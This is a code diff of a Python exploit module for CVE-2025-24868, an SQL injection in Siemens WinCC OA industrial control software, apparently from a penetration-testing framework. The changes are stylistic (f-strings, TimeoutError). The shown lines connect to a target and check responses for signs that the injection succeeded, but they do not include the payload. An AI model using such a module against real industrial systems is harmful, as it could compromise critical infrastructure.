@@ -81,7 +81,7 @@ class Exploit(Exploit):
             print_info("Advisory: https://cert-portal.siemens.com/productcert/html/ssa-195888.html")
             return
 
-        print_status("[CVE-2025-24868] Targeting WinCC OA at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2025-24868] Targeting WinCC OA at {self.target}:{self.port} ...")
         try:
             sock = socket.socket()
             sock.settimeout(10)
@@ -110,16 +110,16 @@ class Exploit(Exploit):
                 if "Microsoft SQL Server" in resp_str or "version" in resp_str.lower():
                     print_success("[CVE-2025-24868] SQL INJECTION CONFIRMED — DB version in response!")
                 elif resp:
-                    print_success("[CVE-2025-24868] Response received — SQLi may have executed ({} bytes)".format(len(resp)))
-                    print_info("Response: {}".format(resp_str[:100]))
+                    print_success(f"[CVE-2025-24868] Response received — SQLi may have executed ({len(resp)} bytes)")
+                    print_info(f"Response: {resp_str[:100]}")
                 else:
                     print_warning("[CVE-2025-24868] No response to probe")
-            except socket.timeout:
+            except TimeoutError:
                 print_warning("[CVE-2025-24868] Timeout — WinCC OA may require different protocol framing")
         except ConnectionRefusedError:
-            print_warning("[CVE-2025-24868] Port {} refused — check WinCC OA API port".format(self.port))
+            print_warning(f"[CVE-2025-24868] Port {self.port} refused — check WinCC OA API port")
         except Exception as exc:
-            print_error("[CVE-2025-24868] Error: {}".format(exc))
+            print_error(f"[CVE-2025-24868] Error: {exc}")
         finally:
             try:
                 sock.close()
